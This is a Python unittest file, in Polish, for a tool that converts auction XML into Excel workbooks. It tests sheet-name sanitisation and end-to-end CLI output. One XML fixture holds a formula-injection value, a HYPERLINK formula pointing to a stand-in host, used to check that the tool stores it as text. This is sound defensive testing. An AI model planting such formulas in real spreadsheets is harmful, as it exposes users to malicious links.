    def test_podstawowe_reguly(self):
        uzyte = set()
        self.assertEqual(safe_sheet_name("aukcja/2026", uzyte), "aukcja_2026")
        self.assertEqual(safe_sheet_name("dane", uzyte), "dane")
        self.assertEqual(safe_sheet_name("DANE", uzyte), "DANE (2)")  # Excel nie rozróżnia
        self.assertEqual(safe_sheet_name("", uzyte), "Arkusz")
        self.assertEqual(safe_sheet_name("a" * 40, uzyte), "a" * 31)
        self.assertEqual(safe_sheet_name("History", set()), "History_")

    def test_nazwa_nie_konczy_sie_apostrofem_po_skroceniu(self):
        """Apostrofy są obcinane PO skróceniu nazwy do 31 znaków.

        Excel odrzuca nazwę arkusza zaczynającą się lub kończącą apostrofem —
        także wtedy, gdy apostrof stoi dokładnie na 31. pozycji.
        """
        wynik = safe_sheet_name("a" * 30 + "'" + "bcdef", set())
        self.assertLessEqual(len(wynik), 31)
        self.assertFalse(wynik.startswith("'"))
        self.assertFalse(wynik.endswith("'"))
        self.assertEqual(wynik, "a" * 30)

    def test_nazwa_nie_zawiera_znakow_nielegalnych_w_xml(self):
        """Samotne surogaty i nie-znaki znikają z nazwy arkusza.

        ``\\ud800``, ``\\udfff``, ``\\ufffe`` i ``\\uffff`` nie dają się zapisać
        w XML-u, więc nie mogą trafić do ``xl/workbook.xml``.
        """
        for znak in ("\ud800", "\udfff", "\ufffe", "\uffff"):
            with self.subTest(znak=hex(ord(znak))):
                wynik = safe_sheet_name("a" + znak + "b", set())
                self.assertNotIn(znak, wynik)
                # nazwa musi dać się zakodować do UTF-8 (zapis do pliku XML)
                wynik.encode("utf-8")


# --------------------------------------------------------------------------- #
# Test „od końca do końca” przez CLI
# --------------------------------------------------------------------------- #


class TestCalejSciezkiCLI(unittest.TestCase):
    """Uruchamia ``python3 -m flexit2xlsx build`` i waliduje wynikowy plik."""

    XML_WZORZEC = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<batch id="{aid}"><lot hash="bcd12"><items>'
        '<item><model>=HYPERLINK("http://zly.example","klik")</model>'
        '<opis><![CDATA[Zażółć <b>gęślą</b> & jaźń "x" \'y\']]></opis>'
        '<cena>1 234,56</cena><serial>007</serial><aktywny>true</aktywny>'
        '<zamkniecie>2026-06-18T14:00:00+02:00</zamkniecie></item>'
        '<item><model>ThinkPad T14</model><cena>99</cena><serial>0012</serial>'
        '<aktywny>false</aktywny></item>'
        '</items></lot></batch>\n'
    )

    def setUp(self):
        self.katalog = tempfile.mkdtemp(prefix="adw-cli-")
        self.wejscie = os.path.join(self.katalog, "xml")
        os.makedirs(self.wejscie)
        self.addCleanup(self._sprzatnij)

    def _sprzatnij(self):
        import shutil
        shutil.rmtree(self.katalog, ignore_errors=True)

    def _uruchom(self, backend, argumenty):
        srodowisko = dict(os.environ)
        srodowisko["PYTHONPATH"] = _KORZEN
        srodowisko["FLEXIT_XLSX_BACKEND"] = backend
        # errors="replace": CLI wypisuje nazwę pliku z surogatami, więc jego
        # własne stdout NIE jest poprawnym UTF-8 — bez tego wysypuje się test.
        return subprocess.run(
            [sys.executable, "-m", "flexit2xlsx"] + argumenty,
            capture_output=True, text=True, errors="replace",
            env=srodowisko, cwd=self.katalog,
        )

    def _zapisz_xml(self, nazwa, aid="AUK-1"):
        sciezka = os.path.join(self.wejscie.encode(), nazwa) \
            if isinstance(nazwa, bytes) else os.path.join(self.wejscie, nazwa)
        tryb_sciezka = sciezka
        with open(tryb_sciezka, "wb") as plik:
            plik.write(self.XML_WZORZEC.format(aid=aid).encode("utf-8"))

    def test_wynik_cli_jest_poprawnym_pakietem_ooxml(self):
        for backend in ("stdlib", "openpyxl"):
            with self.subTest(backend=backend):
                self._zapisz_xml("pakiet.xml")
                wynik = os.path.join(self.katalog, "wynik_%s.xlsx" % backend)
                proces = self._uruchom(backend, ["build", "--in", self.wejscie,
                                                 "--out", wynik, "--overwrite"])
                self.assertEqual(proces.returncode, 0, proces.stderr)
                bledy = sprawdz_pakiet(wynik)
                self.assertEqual(bledy, [], "\n".join(bledy))
                arkusz = openpyxl.load_workbook(wynik)["Wszystkie aukcje"]
                naglowek = [k.value for k in arkusz[1]]
                self.assertEqual(naglowek[:3], ["Aukcja", "Plik", "Nr pozycji"])
                for wiersz in arkusz.iter_rows(min_row=2):
                    self.assertLessEqual(len(wiersz), len(naglowek))
                surowy = zipfile.ZipFile(wynik).read("xl/worksheets/sheet1.xml").decode("utf-8")
                self.assertNotIn("<f>", surowy)
                komorka = [k for k in arkusz[2] if isinstance(k.value, str)
                           and k.value.startswith("=HYPERLINK")]
                self.assertTrue(komorka and komorka[0].data_type == "s")

    def test_cli_per_auction_radzi_sobie_z_nazwa_pliku_spoza_utf8(self):
        """Plik XML o nazwie spoza UTF-8 nie wywala ``build --per-auction``.

        Scenariusz: XML-e rozpakowane z archiwum ZIP zapisanego w cp1250 mają
        w nazwie bajty, które Python dekoduje przez ``surrogateescape``.  Nazwa
        aukcji (a więc i nazwa arkusza) dziedziczy samotne surogaty, które
        muszą zostać odkażone przed zapisem — bez gołego ``UnicodeEncodeError``.
        """
        with open(os.path.join(self.wejscie.encode(), b"pakiet_\xb3\xf3d\xbc.xml"), "wb") as plik:
            plik.write(
                b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b"<batch><lot><items><item><model>A</model></item>"
                b"<item><model>B</model></item></items></lot></batch>\n"
            )
        for backend in ("stdlib", "openpyxl"):
            with self.subTest(backend=backend):
                wynik = os.path.join(self.katalog, "per_%s.xlsx" % backend)
                proces = self._uruchom(backend, ["build", "--in", self.wejscie,
                                                 "--out", wynik, "--overwrite",
                                                 "--per-auction"])
                self.assertEqual(proces.returncode, 0, proces.stderr)
                self.assertNotIn("Traceback", proces.stderr)
                self.assertTrue(os.path.exists(wynik))
                self.assertEqual(sprawdz_pakiet(wynik), [])
                skoroszyt = openpyxl.load_workbook(wynik)
                try:
                    for nazwa in skoroszyt.sheetnames:
                        nazwa.encode("utf-8")   # brak samotnych surogatów
                    self.assertEqual(len(skoroszyt.sheetnames), 3)
                finally:
                    skoroszyt.close()

    def test_bez_per_auction_ta_sama_nazwa_pliku_dziala(self):
        """Kontrola: bez ``--per-auction`` surogaty z nazwy pliku są odkażane."""
        with open(os.path.join(self.wejscie.encode(), b"pakiet_\xb3\xf3d\xbc.xml"), "wb") as plik:
            plik.write(
                b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b"<batch><lot><items><item><model>A</model></item>"
                b"<item><model>B</model></item></items></lot></batch>\n"
            )
        wynik = os.path.join(self.katalog, "ok.xlsx")
        proces = self._uruchom("stdlib", ["build", "--in", self.wejscie,
                                          "--out", wynik, "--overwrite"])
        self.assertEqual(proces.returncode, 0, proces.stderr)
        self.assertEqual(sprawdz_pakiet(wynik), [])

    def test_cli_per_auction_z_ufffe_w_nazwie_pliku(self):
        """Znak U+FFFE w nazwie pliku nie psuje wynikowego .xlsx.

        U+FFFE jest legalny w nazwie pliku, ale ZABRONIONY w XML-u, więc musi
        zniknąć z nazwy arkusza — w obu ścieżkach zapisu, bez cichej korupcji.
        """
        with open(os.path.join(self.wejscie, "pakiet_\ufffe.xml"), "wb") as plik:
            plik.write(
                b'<?xml version="1.0" encoding="UTF-8"?>\n'
                b"<batch><lot><items><item><model>A</model></item>"
                b"<item><model>B</model></item></items></lot></batch>\n"
            )
        for backend in ("stdlib", "openpyxl"):
            with self.subTest(backend=backend):
                wynik = os.path.join(self.katalog, "ffe_%s.xlsx" % backend)
                proces = self._uruchom(backend, ["build", "--in", self.wejscie,
                                                 "--out", wynik, "--overwrite",
                                                 "--per-auction"])
                self.assertEqual(proces.returncode, 0, proces.stderr)
                self.assertIn("Zapisano", proces.stdout)
                self.assertEqual(sprawdz_pakiet(wynik), [])
                etree.fromstring(zipfile.ZipFile(wynik).read("xl/workbook.xml"))
                skoroszyt = openpyxl.load_workbook(wynik)
                try:
                    for nazwa in skoroszyt.sheetnames:
                        self.assertNotIn("\ufffe", nazwa)
                finally:
                    skoroszyt.close()


if __name__ == "__main__":
    unittest.main(verbosity=2)
